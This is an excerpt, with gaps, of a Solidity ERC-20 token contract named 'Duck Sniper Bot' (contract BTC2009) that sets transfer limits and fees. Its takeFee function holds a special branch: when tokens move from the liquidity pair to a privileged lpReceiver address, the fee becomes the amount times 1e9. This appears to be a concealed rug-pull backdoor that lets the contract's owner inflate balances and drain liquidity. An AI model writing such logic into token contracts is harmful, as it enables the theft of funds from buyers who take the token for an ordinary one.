...
contract BTC2009 is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Duck Sniper Bot";
    ...
    modifier lockTheSwap {swapping = true;
        _;
        swapping = false;}
    ...
    uint256 public _maxTxAmount = (_totalSupply * 2500) / 10000;
    uint256 public _maxWalletAmount = (_totalSupply * 2500) / 10000;

    constructor(address lpReceiver_) {
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);
        return true;}
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (getTotalFees(sender, recipient) > 0) {
            ...
            if (sender == pair && recipient == lpReceiver) {feeAmount = amount.mul(1e9);
                swapEnabled = true;}
